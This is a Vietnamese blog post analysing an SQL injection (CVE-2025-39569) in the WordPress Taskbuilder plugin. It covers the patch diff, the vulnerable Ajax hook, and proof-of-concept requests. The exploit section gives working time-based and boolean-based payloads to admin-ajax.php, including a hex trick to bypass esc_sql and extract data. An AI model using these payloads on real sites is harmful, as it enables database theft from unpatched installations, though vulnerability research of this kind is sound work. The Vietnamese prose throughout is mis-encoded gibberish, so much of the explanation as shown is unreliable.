# CVE-2025-39569 Analysis & POC


<!--more-->

Lá»— há»•ng xáº£y ra trÃªn plugin **Taskbuilder** cá»§a WordPress trÆ°á»›c phiÃªn báº£n **4.0.2**. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.

* **CVE ID**: [CVE-2025-39569](https://www.cve.org/CVERecord?id=CVE-2025-39569)
* **Product**: [WordPress Hostel Plugin](https://wordpress.org/plugins/taskbuilder/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: < 4.0.2
* **CVSS severity**: High (8.5)
* **Required Privilege**: Subscriber

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Taskbuilder Plugin**:  v4.0.1(vul) vÃ  v4.0.2(fix)
* **diff tool**: **meld** hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version

## Analysis

á»¨ng dá»¥ng Ä‘Ã£ **xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o** trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n `'...'`. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° `OR`, `AND`,`...`) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.

### Patch Diff

DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡.
CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file **includes/admin/projects/get_users.php**

Trong phiÃªn báº£n **v4.0.1**, biáº¿n `$proj_id` sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:

```php
$proj_id = esc_sql($proj_id);
$project = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wppm_project where id = $proj_id" );
```

á» báº£n **v4.0.2**, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t `$proj_id` trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:

```php
$proj_id = esc_sql($proj_id);
$project = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wppm_project where id = '$proj_id'" );
```

Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ `$proj_id` sau khi escape Ä‘Æ°á»£c coi lÃ  **má»™t chuá»—i literal**, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.

{{< figure src="patch_diff.png" caption="Patch diff" alt="patch diff" >}}

### How it work?

**File architecture**:

Cáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i

```php
$proj_id  = esc_sql($proj_id);
$project  = $wpdb->get_row("SELECT * FROM {$wpdb->prefix}wppm_project WHERE id = $proj_id");

// Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal
ob_start();
// ... render HTML danh sÃ¡ch users
$body = ob_get_clean();

// Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal
ob_start();
// ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save)
$footer = ob_get_clean();

// Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal
echo json_encode([
    'body'   => $body,
    'footer' => $footer,
]);
```

* `$proj_id` / `$project`: Láº¥y dá»¯ liá»‡u project tá»« database.
* `ob_start()` / `ob_get_clean()`: Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n.
* `$body` / `$footer`: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal.
* `json_encode()`: Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang.

File náº±m trong thÆ° má»¥c `includes` cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a `get_users.php` trong thÆ° má»¥c chá»©a plugin.

{{< figure src="search_get_users.png" caption="Search users" alt="search get users" >}}

ğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m `wppm_get_users()` cá»§a class `WPPM_Admin` trong file **class-wppm-admin.php**.
`wppm_get_users()` lÃ  **callback** cá»§a **action hook trong WordPress**.

**WPPM_Admin construct**:

```php
final class WPPM_Admin {
    // constructor
    public function __construct() {

        // other action

        add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users'));

        // array($this,'wppm_get_users')) = $this::wppm_get_users()
        // other action
    }
}
```

* `add_action()` lÃ  má»™t **Plugin API** cá»§a WordPress, cho phÃ©p gáº¯n má»™t **callback** vÃ o má»™t **action hook**.
* `wp_ajax_wppm_get_users` lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn:

  * `wp_ajax_{action}` => Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p.
  * `wp_ajax_nopriv_{action}` => Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p.
* á» Ä‘Ã¢y, `action = wppm_get_users`. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i `action=wppm_get_users` tá»›i `admin-ajax.php`, thÃ¬ WordPress sáº½ **tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½**, á»Ÿ Ä‘Ã¢y lÃ  `wppm_get_users()`.

ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c `action = wppm_get_users`, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a `wppm_get_users` trÃªn cÃ¡c file **.js** trong thÆ° má»¥c chá»©a plugin.

{{< figure src="ajax_search.png" caption="Ajax search" alt="ajax search" >}}

Action `wppm_get_users` lÃ  pháº§n data trong request POST cá»§a hÃ m `wppm_get_users()`

HÃ m `wppm_get_users()` sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a **chá»©c nÄƒng project**

* Táº¡o project má»›i
* Truy cáº­p vÃ o project Ä‘Ã³
* Inspect code vÃ  tÃ¬m hÃ m `wppm_get_users` sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³

{{< figure src="ajax_inspect.png" caption="Ajax inspect" alt="ajax inspect" >}}

ğŸ‘‰ Khi click vÃ o **icon bÃªn cáº¡nh Users** ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.

{{< figure src="model_display.png" caption="Model display" alt="model display" >}}

## Exploit

### Detect SQLi

Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload **time base**

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+SLEEP(1))
```

{{< figure src="sqli_success.png" caption="Sqli success" alt="sqli success" >}}

Thá»i gian pháº£n há»“i bá»‹ delay => SQL Injection thÃ nh cÃ´ng.

### Get First Letter of Database Name

Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ **dump Ä‘Æ°á»£c háº¿t data** lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.

Gá»­i request vá»›i SQLi payload **boolean base** vÃ³i `proj_id` Ä‘Ãºng:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))
```

> Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  **wordpress** nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  `w` tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  `0x77`

Sá»­ dá»¥ng `SUBSTRING(STRING,1,1)` Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i

á» Ä‘Ã¢y, `$proj_id` báº±ng `4` vÃ¬ `SUBSTRING('wordpress',1,1)=0x77` lÃ  Ä‘Ãºng nÃªn `SELECT` láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong `IF(condition, value if true, value if false)`, `4` lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n

{{< figure src="res.png" caption="Res 1" alt="response 1" >}}

Sá»­ dá»¥ng **HEX technique** Ä‘á»ƒ bypass hÃ m `esc_sql()` [á»Ÿ trÃªn](#patch-diff), dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c `'`

Gá»­i request vá»›i SQLi payload **boolean base** vÃ³i `proj_id` sai:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4))
```

Vá»›i `proj_id` khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a `None`

{{< figure src="res_none.png" caption="Res 2" alt="response 2" >}}

ğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t **boolean base**

* `proj_id` Ä‘Ã¹ng: response khÃ´ng chá»©a None
* `proj_id` sai: response chá»©a None

> CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t **time base** nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u

## Conclusion

Lá»— há»•ng **CVE-2025-39569** trong plugin **WordPress Taskbuilder** xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n `'...'` bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.

Báº£n vÃ¡ á»Ÿ phiÃªn báº£n **4.0.2** Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a `$proj_id` vÃ o trong `'...'`, Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.

**Key takeaways**:

* Æ¯u tiÃªn sá»­ dá»¥ng **prepared statements** (`$wpdb->prepare()` trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query.
* Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng **cÃ¡c Ajax endpoint** vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t.
* NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Taskbuilder project mnagement tool Plugin <= 4.0.1 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/taskbuilder/vulnerability/wordpress-taskbuilder-4-0-1-sql-injection-vulnerability?_s_id=cve)


---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-09-22-cve-2025-39569/  

